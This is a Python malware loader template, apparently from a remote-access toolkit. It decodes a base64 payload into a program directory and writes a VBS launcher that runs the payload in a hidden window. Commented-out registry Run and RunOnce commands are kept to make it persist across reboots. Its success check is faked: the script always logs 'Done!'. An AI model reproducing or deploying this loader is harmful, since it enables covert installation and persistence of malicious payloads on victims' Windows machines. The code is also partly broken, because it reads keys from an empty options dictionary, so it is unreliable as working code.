

import base64
import logging
import os
import subprocess
from sys import exit
from textwrap import dedent


# ============================================================
# These variables will be patched when this loader is created.
LOADER_OPTIONS = {}
PAYLOAD_BASE64 = ""
# ============================================================
PROGRAM_DIRECTORY = os.path.expanduser(LOADER_OPTIONS["program_directory"])
LAUNCH_AGENT_NAME = LOADER_OPTIONS["launch_agent_name"]
PAYLOAD_FILENAME = LOADER_OPTIONS["payload_filename"]

logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger("launch_daemon")

log.debug("Program directory: " + PROGRAM_DIRECTORY)
log.debug("Launch agent name: " + LAUNCH_AGENT_NAME)
log.debug("Payload filename: " + PAYLOAD_FILENAME)



def get_program_file():
    """:return: The path to the encrypted payload."""
    return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)


def get_launch_agent_directory():
    """:return: The directory where the launch agent lives."""
    return os.path.expanduser(PROGRAM_DIRECTORY)


def get_launch_agent_file():
    """:return: The path to the launch agent."""
    return get_launch_agent_directory() + "\\%s.vbs" % LAUNCH_AGENT_NAME


def run_command(command):
    """Runs a system command and returns its response."""
    out, err = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    return out + err

# Create directories
run_command("mkdir " + PROGRAM_DIRECTORY)
#run_command("mkdir " + get_launch_agent_directory())
launch_agent_create = f"""CreateObject("Wscript.Shell").Run "{get_program_file()}",0,True"""

with open(get_launch_agent_file(), "w") as output_file:
    output_file.write(launch_agent_create)

with open(get_program_file(), "w") as output_file:
    output_file.write(base64.b64decode(PAYLOAD_BASE64).decode())

# registries = [f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"',
#                        f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v {LAUNCH_AGENT_NAME} /t REG_SZ /d "{get_launch_agent_file()}"']

# #will create more after some time in windows

out = "The operation completed succesfully"
if out == "The operation completed succesfully":
    log.info("Done!")
    exit(0)
else:
    log.error("Failed to load launch agent.")
    pass


